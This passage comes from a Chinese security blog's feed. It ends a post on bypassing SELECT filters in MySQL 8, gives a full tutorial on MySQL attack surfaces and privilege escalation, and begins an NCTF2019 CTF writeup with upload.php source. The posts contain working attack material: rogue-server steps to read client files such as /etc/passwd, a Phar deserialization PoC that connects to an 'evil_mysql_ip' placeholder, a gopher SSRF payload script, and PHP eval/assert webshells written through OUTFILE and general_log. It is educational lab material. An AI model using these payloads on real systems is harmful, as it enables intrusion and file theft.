1)#</span><br></pre></td></tr></table></figure><p>语句table user limit 1的查询结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+---------+</span><br><span class="line">| id | username | passwd  |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">|  1 | admin    | adminpw |</span><br><span class="line">+----+----------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>实质上是<code>(id, username, passwd)</code>与<code>(1, 'admin', 'adminpw')</code>进行比较，比较顺序为自左向右 两个元组第一个字符比大小，如果第一个字符相等就比第二个字符的大小，以此类推，最终结果即为元组的大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (1, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (2, &#39;&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   0 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| (1, &#39;a&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    1 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| (1, &#39;ad&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                     1 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1);</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| (1, &#39;ae&#39;, &#39;&#39;) &lt; (TABLE user LIMIT 1)  |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">|                                     0 |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>转载自：<a href="https://0xgeekcat.github.io/%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4.html">https://0xgeekcat.github.io/利用MySQL8新特性绕过select过滤.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入手册【转】&quot;&gt;SQL注入手册【转】&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C&lt;/p&gt;
&lt;/blockquo
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="SQL注入" scheme="http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>MySQL攻击面和提权总结</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2020-12-10T15:11:36.000Z</published>
    <updated>2020-12-10T15:13:20.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL攻击面和提权总结">MySQL攻击面和提权总结</h1><p>本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。</p><p>其中均使用宝塔面板搭建MySQL8.0版本。</p><p>首先要开放腾讯云主机的端口，并且允许MySQL Server允许任意用户远程登录。</p><h2 id="0x01-攻击面——MySQL客户端任意文件读取">0x01 攻击面——MySQL客户端任意文件读取</h2><blockquote><p>适用范围：全版本 MySQL/MariaDB Client</p><p>条件：客户端连接时开启 –enable-local-infile</p></blockquote><p>一开始做实验的时候有点懵逼，我作为攻击方去连接受害者的MySQL客户端，然后再读取我本地的文件？？？</p><p>后来我再网上查看这个攻击面的利用场景，虽然确实用的地方比较少，但是看了<strong>LoRexxar</strong>这篇<a href="https://paper.seebug.org/1112/">文章</a>之后，还是很有收获的。</p><blockquote><p>这个实验的前提MySQL变量<code>local_infile=1</code></p></blockquote><p>CTFer对MySQL的load data infile语句应该都是比较熟悉的，一般形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure><p>MySQL Server会读取服务端的<code>/etc/passwd</code>然后将数据按照<code>\n</code>分割插入表中，但是非local加载的语句收到<code>secure_file_priv</code>的限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+--------------------+</span><br><span class="line">| @@secure_file_priv |</span><br><span class="line">+--------------------+</span><br><span class="line">| NULL               |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>但是加上一个local关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br><span class="line">Query OK, 4 rows affected, 1 warning (0.02 sec)</span><br><span class="line">Records: 4  Deleted: 0  Skipped: 0  Warnings: 1</span><br></pre></td></tr></table></figure><p>是可以成功执行的，相当于是读取客户端的文件发送到服务端。</p><p>MySQL认为<strong>服务端可以要求客户端读取有可读权限的任何文件，客户端不应该连接到不可信的服务端</strong>。</p><p>那么现在的问题就是如何构造一个恶意的MySQL服务端。</p><p>在搞清楚这个问题之前，我们需要研究一下mysql正常执行链接和查询的数据包结构。</p><ol><li>Sever返回greeting包，包含版本，协议类型，salt值，server功能项</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109131329.png" alt=""></p><ol start="2"><li>客户端登录请求</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109134218.png" alt=""></p><p>不知道为啥请求包没有显示用户名，可能是MySQL版本的原因。</p><ol start="3"><li>初始化查询</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109135309.png" alt=""></p><p>由于使用了SSL通信，所以这里看不到具体的初始化查询语句。</p><ol start="4"><li>Load file data</li></ol><p>这次得把MySQL的SSL连接关闭掉，不然看不到执行语句。方法就是在MySQL的配置文件my.conf的[mysqld]添加<code>skip_ssl</code>即可，再在客户端检查一下是否已经关闭SSL：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140218.png" alt=""></p><p>确认关闭后，执行load file data语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39; into table mytable FIELDS TERMINATED BY &#39;\n&#39;;</span><br></pre></td></tr></table></figure><p>首先是客户端发发送查询</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109140817.png" alt=""></p><p>接着服务端返回了需要的路径，功能类似于告诉客户端把这个文件发给我让我看看</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145329.png" alt="">****</p><p>然后客户端直接把内容发送到了服务端</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109145747.png" alt=""></p><p>从上面这个流程可以看出，客户端读取文件的路径并不是从客户端指定的，而是从服务端指定再发送客户端。</p><p>正常的查询流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client: 我要把&#x2F;etc&#x2F;passwd插入表中</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为...</span><br></pre></td></tr></table></figure><p>如果是一个恶意的服务端，可以把流程更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client: 我要test表中的内容</span><br><span class="line">Server: 我要你的&#x2F;etc&#x2F;passwd的内容</span><br><span class="line">Client: &#x2F;etc&#x2F;passwd的内容为？？？</span><br></pre></td></tr></table></figure><p>并且从MySQL的官方文档中指出<strong>服务端可以在任何查询语句后回复文件传输请求</strong>，也就是说上面第三个语句是可以执行的。</p><p>所以构造一个恶意服务端的流程就是：1.回复MySQL client一个greeting包；2.等待client端发送一个查询包；3.回复一个file transfer包。</p><p>发现这个漏洞的原作者给出了POC，但是LoRexxar文中提到这个POC并没有适配所有的情况，部分mysql客户端会在登陆成功之后发送ping包，如果没有回复就会断开连接，也有部分mysql client端对greeting包有较强的校验。</p><p>这里就拿网上更改之后的POC来拿做实验：<a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><ol><li>暂停MySQL Server服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysqld stop</span><br></pre></td></tr></table></figure><ol start="2"><li>运行恶意MySQL服务器脚本</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure><ol start="3"><li>客户端访问MySQL服务器</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h xxx -u root -p</span><br></pre></td></tr></table></figure><ol start="4"><li>查看mysql.log文件</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201109153808.png" alt=""></p><p>LoRexxar文章中还接着提到了关于这个漏洞的进一步利用，比如说读取配置文件，Phar反序列化等等。</p><p>其中Phar反序列化这个还挺有意思的，首先生成一个phar：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a &quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> A();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后用test.php模拟一次查询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pwned!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;&#123;evil_mysql_ip&#125;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="number">3667</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;select 1;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>伪造的evil mysql server中让mysql client去做<code>load file local</code>查询，读取本地的phar文件。</p><h2 id="0x02-攻击面——利用SSRF攻击MySQL">0x02 攻击面——利用SSRF攻击MySQL</h2><blockquote><p>适用范围：全版本 MySQL/MariaDB Server</p><p>条件：拥有空密码用户</p></blockquote><p>之前在总结SSRF漏洞的时候提到过利用SSRF攻击Redis和FastCGI，没写过关于MySQL。</p><p>同样的，利用SSRF攻击MySQL也需要了解MySQL的完整交互协议，并且伪造客户端，通过SSRF进行交互连接。</p><p>参考文章同样来自于一篇Seebug上的文章：<a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><p>这个利用条件比较苛刻，可以归属于未授权访问，因为非交互模式下登录并操作MySQL只能无需密码认证。</p><p>关于MySQL的认证过程和报文格式我就不多叙述，这里直接演示一下过程，以腾讯云主机MySQL80作为实验机，本地登录。</p><p>首先需要新建一个MySQL用户，并且密码为空，使用root登录MySQL后执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT USAGE ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br><span class="line">GRANT ALL ON *.* TO &#39; usernopass&#39;@&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p>有两个办法，一种是用gopherus工具直接生成payload。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130516.png" alt=""></p><p>另外一种是自己抓包生成原始数据流，再转换成gopher协议的格式。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201110130638.png" alt=""></p><p>再利用脚本转换一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">s</span>):</span></span><br><span class="line">a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> result(s)</span><br></pre></td></tr></table></figure><p>但是这两种办法我都没能复现出来，可能是看不到执行的结果。</p><p>接下来，可以使用SSRF攻击MySQL，那么就可以利用MySQL写入webshell，但是要求secure_file_priv不能为空。</p><h2 id="0x03攻击面——MySQL服务端文件读写">0x03攻击面——MySQL服务端文件读写</h2><p>这个就比较简单了，但是对要求服务端配置可读写目录和正确的用户权限。</p><p>读文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE (&#39;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&#39;) AS Result;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database test;</span><br><span class="line">CREATE TABLE test (id TEXT, content TEXT);</span><br><span class="line">load data infile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot; into table test.test FIELDS TERMINATED BY &#39;\n\r&#39; ;</span><br></pre></td></tr></table></figure><p>写文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat (id) from test INTO OUTFILE &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaaa&quot;;</span><br></pre></td></tr></table></figure><h2 id="0x04提权">0x04提权</h2><p>提权就不写那么详细了，主要是参考m00nback的文章：<a href="https://www.m00nback.xyz/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://www.m00nback.xyz/2020/03/30/mysql提权总结/</a></p><h3 id="CVE-2012-2122">CVE-2012-2122</h3><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><p>影响版本：</p><ul><li>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.</li><li>MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</li></ul><p>MSF有相关利用模块：<code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump</code></p><h3 id="写shell">写shell</h3><h4 id="outfile写shell">outfile写shell</h4><p>跟上面描述的差不多，关键还是<code>secure_file_priv</code>这个参数，而且是只读参数，必须更改MySQL的配置文件再重启MySQL服务。</p><p>来个🌰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; into outfile &quot;&#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;aaa&quot;;</span><br></pre></td></tr></table></figure><h4 id="日志写shell">日志写shell</h4><p>前提是知道MySQL root用户密码，第一步开启日志记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;;</span><br></pre></td></tr></table></figure><p>日志文件导出到指定目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file&#x3D;&quot;&#x2F;tmp&#x2F;shell.php&quot;;</span><br></pre></td></tr></table></figure><p>记录SQL语句写shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&quot;;</span><br></pre></td></tr></table></figure><p>关闭记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;off&#39;;</span><br></pre></td></tr></table></figure><h3 id="UDF提权">UDF提权</h3><p>大马提权：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/大马/udf.php</a></p><p>手工提权：<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p><p><a href="https://cooltige.com/2020/06/02/Mysql-Udf%E6%8F%90%E6%9D%83/">https://cooltige.com/2020/06/02/Mysql-Udf提权/</a></p><p><a href="https://xz.aliyun.com/t/2199">https://xz.aliyun.com/t/2199</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL攻击面和提权总结&quot;&gt;MySQL攻击面和提权总结&lt;/h1&gt;
&lt;p&gt;本次实验使用腾讯云主机的MySQL Server作为服务端，阿里云主机作为MySQL客户端。&lt;/p&gt;
&lt;p&gt;其中均使用宝塔面板搭建MySQL8.0版本。&lt;/p&gt;
&lt;p&gt;首先要开放腾讯云主机的
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="MySQL" scheme="http://ca0y1h.top/tags/MySQL/"/>
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2019-PharMatchesEverything</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything/</id>
    <published>2020-12-10T14:54:33.000Z</published>
    <updated>2020-12-10T14:56:20.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF2019-Phar-matches-everything">NCTF2019 Phar matches everything</h1><p>去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。</p><p>原题目提示是通过vim的备份文件下载源码，但是BUU上的环境好像没有备份文件，只能从GitHub上下载<code>catchmime.php</code>和<code>upload.php</code>两个文件的源代码，</p><p>首先是upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target_dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line">$uploadOk = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">$imageFileType=substr($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],strrpos($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>],<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>,strlen($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line"></span><br><span class="line">$file_name = md5(time());</span><br><span class="line">$file_name =substr($file_name, <span class="number">0</span>, <span class="number">10</span>).<span class="string">&quot;.&quot;</span>.$imageFileType;</span><br><span class="line"></span><br><span class="line">$target_file=$target_dir.$file_name;</span><br><span class="line"></span><br><span class="line">    $check = getimagesize($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">        $uploadOk = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($imageFileType !== <span class="string">&quot;jpg&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;png&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;gif&quot;</span> &amp;&amp; $imageFileType !== <span class="string">&quot;jpeg&quot;</span>  ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, only jpg,png,gif,jpeg are allowed.&quot;</span>;</span><br><span class="line">    $uploadOk = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($uploadOk == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 